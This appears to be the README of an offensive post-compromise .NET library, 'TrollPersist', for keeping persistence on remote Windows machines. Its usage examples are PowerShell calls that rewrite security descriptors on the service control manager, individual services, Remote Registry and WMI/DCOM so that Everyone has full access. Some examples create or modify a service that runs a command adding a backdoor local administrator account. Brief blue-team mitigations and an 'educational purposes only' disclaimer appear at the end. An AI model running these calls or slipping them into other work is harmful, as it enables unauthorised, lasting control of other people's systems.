# TrollPersist
A Post-Compromise .NET library to embed persistency to persistency by abusing Security Descriptors of remote machines. The techniques incorporated are not novel but I've yet to come across a granular, fully reflective, simple and convenient .NET library that does the following:
1. Abuse SD of Remote SCM/SVC, Remote Registry, Remote WMI
2. Modify any registry key's permissions and propogate to subkeys

# Compilation

1. Git clone / download project and open with visual studio
2. Rightclick the project -> add reference and add *System.Management* and add *System.Management.Instrumentation*
3. Compile as x64, Release\
\
*******No other dependencies*******

# Nomenclature
Methods are named according to **PROTOCOL_ACTION**\
so REG_ModifyRegistryPermissions\
means it uses the RemoteRegistry protocol to modify registry permissions..

# Caveats
1. The library checks the SDDL syntax but not the SDDL logic, so best to stick to example SDDL and just change the principal of the SDDL
2. As this is a Post-Compromise library, it assumes you are running with the relevant privileges and permissions already.
3. Library is focused for domain environments, but you can use it in workgroup with the relevant additional changes.


# library

**REG_ModifyRegistryPermissions(string hostname, string subkey, string principal, bool propogate)**
```
- subkey: must be like "SYSTEM\<key>" or "SYSTEM\<key>\<key>"
- principal: "EVERYONE", "Domain\User", etc
- propogate: if true, will set permissions to subkeys of the key
```

**REG_ModifyRegistryContainingSD(string type, string hostname, string SDDL, string key, string value)**
```
- type: "DCOM" or "SVC" or "SCM"
- SDDL: any legitimate SDDL string such as "(A;;KA;;;WD)" or "(A;;KA;;;S-1-1-0)"
- Key: key name
- value: value name
```

**WMI_ModifyWMISD(string hostname, string SDDL)**
```
- SDDL: Change the principal component of the SDDL string such as "(A;;CCDCRP;;;WD)" or "(A;;CCDCRP;;;S-1-1-0)" 
```

**REG_CreateRegKey(string hostname, string key, string value, object data, int REG_TYPE)**
```
- data: depending on REG_TYPE, you can pass string for string, int for Dword or byte[] for Binary
- REG_TYPE: String = 1, Binary = 3, DWord = 4
```

**SCM_CreateAndStart(string hostname, string servicename, string binarypath)**
```
- servicename: service to create 
- binarypath: binarypath in the for "c:\windows\..\example.exe" or "cmd /c blah blah blah"
```

**SVC_ModifyAndStart(string hostname, string servicename, string BinaryPathName)**
```
- servicename: service to create 
- binarypath: binarypath in the for "c:\windows\..\example.exe" or "cmd /c blah blah blah"
```


# Example Usage

## SCM SD, allow everyone  - Requires Reboot for services.exe to restart!!
```
#Modify SD to allow "EVERYONE" access to service control manager
[TrollPersist.SecurityDescriptor]::REG_ModifyRegistryContainingSD("SCM","Hostname","(A;;KA;;;WD)","SYSTEM\CurrentControlSet\Control\ServiceGroupOrder\Security", "Security")

#Set exemption for non-admin to access services. This sets for all services, you can use REG_CreateRegKey to set for specific service.
[TrollPersist.SecurityDescriptor]::REG_CreateRegKey("Hostname", "SYSTEM\CurrentControlSet\Control", "RemoteAccessExemption", 1, 4)

#After reboot - You must use the provided SCM_CreateAndStart() function. sc.exe will not work to start the service.
#Create and start service
[TrollPersist.SecurityDescriptor]::SCM_CreateAndStart("Hostname","troll","cmd /c net users /add troll Trolololol123 && net localgroup administrators /add troll")
```
## SVC SD, allow everyone  - Requires Reboot for services.exe to restart!! 
```
#Modify SD to allow "EVERYONE" access to specific service (eg.PlugPlay)
[TrollPersist.SecurityDescriptor]::REG_ModifyRegistryContainingSD("SVC","Hostname","(A;;KA;;;WD)","SYSTEM\CurrentControlSet\Services\PlugPlay\Security", "Security")

#Set exemption for non-admin to access services. This sets for all services, you can use REG_CreateRegKey to set for specific service.
[TrollPersist.SecurityDescriptor]::REG_CreateRegKey("Hostname", "SYSTEM\CurrentControlSet\Control", "RemoteAccessExemption", 1, 4)

#After reboot - You must use the provided SVC_ModifyAndStart() function. sc.exe will not work to start the service.
#Modify and start service
[TrollPersist.SecurityDescriptor]::SVC_ModifyAndStart("Hostname", "troll", "cmd /c net users /add troll Trolololol123 && net localgroup administrators /add troll")
```
## REG SD, allow everyone 
```
#Modify SD to allow "EVERYONE" access to remote registry service
[TrollPersist.SecurityDescriptor]::REG_ModifyRegistryPermissions("Hostname","SYSTEM\CurrentControlSet\Control\SecurePipeServers\winreg","EVERYONE",$false)

#Modify key to allow write  
[TrollPersist.SecurityDescriptor]::REG_ModifyRegistryPermissions("Hostname","SYSTEM\CurrentControlSet\Control","EVERYONE",$true)

#Alternatively, you can set it on "SYSTEM", which lets you create services, scheduled tasks just via registry keys (eg. GhostTask)
```
## WMI SD, allow everyone 
```
#Modify SD to allow "EVERYONE" access to WMI
[TrollPersist.SecurityDescriptor]::WMI_ModifyWMISD("Hostname","(A;;CCWP;;;WD)") 
[TrollPersist.SecurityDescriptor]::REG_ModifyRegistryContainingSD("DCOM","Hostname","(A;;CCDCRP;;;WD)","software\microsoft\ole", "MachineLaunchRestriction")

#Can use any wmi tool to connect (eg. SharpWMI)
```

# Blue Team and Mitigations
1. GPO! GPO! GPO! ENFORCE VIA GPO!
2. Monitor Registry Changes for the ones mentioned ^
3. Monitor SERVICE CREATION / STOP / START
4. Firewall off unneeded protocols

# Wishlist - which i will not be pursuing
1. Add features for PSRemoting, ScheduledTask and yada yada
2. REG_ uses RemoteRegistry, you can incporate WMI to perform registry actions as well to make WMI_ModifyRegistryPermissions

# References

# Disclaimer
For educational purposes only!
